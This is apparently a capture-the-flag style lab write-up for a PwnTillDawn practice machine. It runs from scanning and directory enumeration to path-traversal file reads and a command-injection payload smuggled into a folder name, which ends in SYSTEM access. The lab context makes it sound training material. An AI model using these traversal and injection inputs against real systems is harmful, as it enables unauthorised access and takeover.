# VULNERABLE-MACHINE-PwnTillDwn
# 🛡️ Vulnerability Analysis Lab – PwnTillDawn (Beginner)

## 📌 Objective

* Connect to PwnTillDawn VPN
* Discover target machine
* Perform vulnerability analysis
* Exploit system and obtain proof of compromise (flag or SYSTEM access)

---

## 🔌 Step 1 – VPN Connection

Connected to the lab environment using:

```bash
sudo openvpn PwnTillDawn.ovpn
```

Successful connection confirmed with:

```
Initialization Sequence Completed
```

---

## 🌐 Step 2 – Network Discovery

Performed ping scan to identify live hosts:

```bash
nmap -sn 10.150.150.0/24
```

✔ Found multiple active hosts
✔ Selected target:

```
10.150.150.11
```

---

## 🔍 Step 3 – Port Scanning

```bash
nmap -sC -sV 10.150.150.11
```

### 📊 Results:

| Port | Service | Version         |
| ---- | ------- | --------------- |
| 21   | FTP     | Xlight ftpd     |
| 80   | HTTP    | Apache 2.4.46   |
| 443  | HTTPS   | Apache          |
| 445  | SMB     | Windows Server  |
| 1433 | MSSQL   | SQL Server 2012 |
| 3306 | MySQL   | MariaDB         |
| 3389 | RDP     | Windows         |

---

## 🌐 Step 4 – Web Enumeration

Accessed web application:

```
http://10.150.150.11
```

Used Gobuster:

```bash
gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt
```

### 🔎 Discovered:

* `/admin`
* `/upload`
* `/myfiles.php`
* `/download.php`

---

## 🚨 Step 5 – Vulnerability Discovery

### 1. Broken Access Control

* Able to access `/admin`
* Could **create users without authentication**

---

### 2. File Upload Functionality

* Logged in and accessed `/myfiles.php`
* Able to upload files to:

```
/upload/11/
```

---

### 3. Local File Inclusion (LFI)

Discovered vulnerable endpoint:

```
download.php?mode=view_file_content&filename=
```

✔ Successfully read system file:

```
../../../../windows/win.ini
```

---

### 4. Source Code Disclosure

Accessed configuration file:

```
../../../../xampp/htdocs/config.php
```

### 🔥 Critical finding:

```php
define('CMD_INJ_ON_FOLDER_CREATE', true);
```

👉 Indicates **Command Injection vulnerability**

---

## 💥 Step 6 – Exploitation (Command Injection)

Used folder creation feature to inject commands:

```
test & whoami > C:\xampp\htdocs\upload\11\result.txt
```

---

## 🏆 Step 7 – Proof of Compromise

Accessed result file:

```
http://10.150.150.11/upload/11/result.txt
```

### ✅ Output:

```
nt authority\system
```

---

## 🎯 Conclusion

Successfully achieved:

* Remote Code Execution (RCE)
* SYSTEM-level access

This confirms **full compromise of the target machine**

---

## 🔐 Vulnerabilities Identified

1. Broken Access Control
2. Local File Inclusion (LFI)
3. Command Injection (Critical)

---

## 🧠 Lessons Learned

* Misconfigured access controls can expose admin functionality
* LFI can lead to source code disclosure
* Source code analysis can reveal hidden vulnerabilities
* Command injection leads to full system compromise

---

## 📌 Status

✔ Lab Completed (Proof of Compromise Achieved)

---
